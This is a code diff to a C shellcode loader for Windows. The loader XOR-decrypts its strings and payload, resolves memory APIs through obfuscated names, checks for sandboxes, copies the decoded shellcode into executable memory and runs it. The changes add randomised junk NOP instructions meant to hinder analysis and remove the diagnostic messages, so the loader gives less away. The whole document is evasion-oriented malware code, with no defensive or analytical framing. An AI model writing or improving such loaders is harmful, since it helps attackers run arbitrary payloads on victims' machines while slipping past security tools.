@@ -29,7 +29,7 @@ unsigned char calculate_xor_key() {
 void xor_decrypt(unsigned char *data, size_t len, unsigned char key) {
     for (size_t i = 0; i < len; i++) {
         data[i] ^= key;
-        __asm__("nop");  // Insert junk instruction to obfuscate analysis
+        if (i % 2 == 0) __asm__("nop");  // Insert junk instruction to obfuscate analysis
     }
 }
 
@@ -38,6 +38,7 @@ void decrypt_xor_string(unsigned char *str, unsigned char key) {
     while (*str) {
         *str ^= key;
         str++;
+        if (rand() % 4 == 0) __asm__("nop");
     }
 }
 
@@ -112,13 +113,11 @@ int execute_shellcode() {
     void (*pRtlMoveMemory)(void*, const void*, SIZE_T) = (void (*)(void*, const void*, SIZE_T))GetProcAddress(hNtdll, (char*)encRtlMoveMemory);
 
     if (!pVirtualAlloc || !pRtlMoveMemory) {
-        printf("Failed to resolve function addresses.\n");
         return 1;
     }
 
     // Anti-sandbox check
     if (detect_sandbox()) {
-        printf("Sandbox detected. Exiting.\n");
         return 1;
     }
 
@@ -126,7 +125,6 @@ int execute_shellcode() {
     size_t shellcode_len;
     unsigned char *shellcode = load_shellcode(&shellcode_len);
     if (!shellcode) {
-        printf("Failed to load shellcode.\n");
         return 1;
     }
 
@@ -135,7 +133,6 @@ int execute_shellcode() {
     // Allocate memory and move shellcode
     void *exec = pVirtualAlloc(0, shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     if (exec == NULL) {
-        printf("Memory allocation failed.\n");
         free(shellcode);
         return 1;
     }
@@ -147,14 +144,12 @@ int execute_shellcode() {
     unsigned char *modifier = (unsigned char *)exec;
     for (size_t i = 0; i < shellcode_len; i++) {
         modifier[i] ^= xor_key;
-        __asm__("nop");  // Junk instruction to obfuscate analysis
+        if (rand() % 2 == 0) __asm__("nop");  // Junk instruction to obfuscate analysis
     }
 
     // Execute the shellcode
     void (*func)() = (void (*)())exec;
 
-    // Delay execution to avoid sandbox analysis
-    Sleep(5000);
     func();
 
     return 0;
